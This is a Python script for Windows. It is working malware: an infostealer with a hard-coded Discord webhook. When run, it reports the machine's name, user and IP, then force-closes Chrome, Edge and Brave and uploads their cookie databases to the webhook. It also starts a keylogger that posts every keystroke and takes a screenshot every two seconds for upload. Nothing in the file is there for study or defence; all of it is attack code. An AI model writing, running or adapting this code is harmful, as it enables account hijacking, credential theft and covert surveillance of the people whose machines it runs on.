import os
import threading
import time
import requests
import pyautogui
import subprocess
import shutil
import platform
import getpass
import socket
from pynput import keyboard

# Configuration
WEBHOOK = "https://discord.com/api/webhooks/1524802721197195315/SsvvW43_3S5_hvZLH1HOV0i_TNHnwhirZWhf4c-Bqjk0GnkcUMuuz3G3aqTm7OUundi6"
BROWSER_PROCESSES = {"Chrome": "chrome.exe", "Edge": "msedge.exe", "Brave": "brave.exe"}
BROWSER_PATHS = {
    "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data'),
    "Edge": os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data'),
    "Brave": os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data')
}

# 1. Identity Header
def send_identity():
    identity = {
        'PC Name': platform.node(),
        'User': getpass.getuser(),
        'OS': 'Windows 11',
        'IP': socket.gethostbyname(socket.gethostname())
    }
    requests.post(WEBHOOK, json={"content": f"**System Initialization:**\n{identity}"})

# 2. Cookie Collection
def force_close(p_name): subprocess.run(f"taskkill /f /im {p_name}", shell=True, capture_output=True)

def collect_cookies():
    out_dir = os.path.join(os.getcwd(), "Extracted_Cookies")
    if not os.path.exists(out_dir): os.makedirs(out_dir)
    for name, path in BROWSER_PATHS.items():
        if os.path.exists(path):
            force_close(BROWSER_PROCESSES[name])
            for root, _, files in os.walk(path):
                if "Network" in root and "Cookies" in files:
                    dest = os.path.join(out_dir, f"{name}_Cookies.db")
                    shutil.copy2(os.path.join(root, "Cookies"), dest)
                    with open(dest, "rb") as f:
                        requests.post(WEBHOOK, files={"file": f})

# 3. Keylogger & Screenshotter (Real-time)
def start_keylogger():
    def on_press(key): requests.post(WEBHOOK, json={"content": f"Key: {key}"})
    with keyboard.Listener(on_press=on_press) as listener: listener.join()

def start_screenshotter():
    while True:
        img = pyautogui.screenshot()
        img.save("s.png")
        with open("s.png", "rb") as f:
            requests.post(WEBHOOK, files={"file": f})
        time.sleep(2)

if __name__ == "__main__":
    send_identity()
    collect_cookies()
    threading.Thread(target=start_keylogger, daemon=True).start()
    start_screenshotter()